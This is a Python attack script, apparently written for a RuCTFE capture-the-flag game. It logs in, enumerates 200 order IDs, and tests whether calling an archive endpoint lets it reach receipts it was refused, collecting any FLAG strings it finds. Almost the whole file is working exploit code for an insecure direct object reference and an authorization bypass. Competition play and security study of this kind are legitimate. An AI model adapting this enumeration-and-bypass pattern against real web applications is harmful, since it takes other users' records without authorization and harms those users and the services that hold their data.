import requests
import re
from time import sleep

BASE_URL = "http://0-3000.cks.sa.ructfe.org"
USERNAME = "<dummy_username>"
PASSWORD = "<dummy_password>"

def authenticate():
    session = requests.Session()
    
    # Step 1: Get user_id
    r1 = session.post(f"{BASE_URL}/login", data={"username": USERNAME}, timeout=10)
    user_id = re.search(r'user_id["\s:=]+(\d+)', r1.text)
    if not user_id:
        return None
    
    user_id = user_id.group(1)
    print(f"[+] user_id: {user_id}")
    
    # Step 2: Login with password
    r2 = session.post(f"{BASE_URL}/login", data={"user_id": user_id, "password": PASSWORD}, timeout=10)
    
    if r2.status_code in [200, 302]:
        print(f"[+] Authenticated: {dict(session.cookies)}")
        return session
    return None

session = authenticate()
if not session:
    print("[-] Auth failed")
    exit()

print("\n[*] Testing orders 300000-300199\n")

authorized = []
unauthorized = []
not_found = []
flags = []
archived = []

for oid in range(300000, 300200):
    if (oid % 50) == 0:
        print(f"[{oid}] Auth:{len(authorized)} Unauth:{len(unauthorized)} 404:{len(not_found)} Flags:{len(flags)}")
    
    try:
        # Check receipt
        r = session.get(f"{BASE_URL}/order/{oid}/receipt", timeout=5)
        
        if r.status_code == 200:
            authorized.append(oid)
            
            # Look for flags
            flag_list = re.findall(r'FLAG\{[^}]+\}', r.text)
            if flag_list:
                for f in flag_list:
                    print(f"\n[!!!] FLAG in order {oid}: {f}")
                    flags.append((oid, f, r.text))
        
        elif r.status_code == 401:
            unauthorized.append(oid)
            
            # Try archive
            ar = session.get(f"{BASE_URL}/order/{oid}/archive", timeout=5)
            if ar.status_code == 200:
                sleep(0.05)
                rr = session.get(f"{BASE_URL}/order/{oid}/receipt", timeout=5)
                if rr.status_code == 200:
                    archived.append(oid)
                    print(f"\n[!] {oid} accessible after archive")
                    
                    flag_list = re.findall(r'FLAG\{[^}]+\}', rr.text)
                    if flag_list:
                        for f in flag_list:
                            print(f"[!!!] FLAG in order {oid}: {f}")
                            flags.append((oid, f, rr.text))
        
        elif r.status_code == 404:
            not_found.append(oid)
    
    except Exception as e:
        print(f"[E] {oid}: {e}")

print("\n" + "="*60)
print("RESULTS (300000-300199)")
print("="*60)
print(f"Authorized: {len(authorized)} - {authorized}")
print(f"Unauthorized: {len(unauthorized)} - {unauthorized[:20]}")
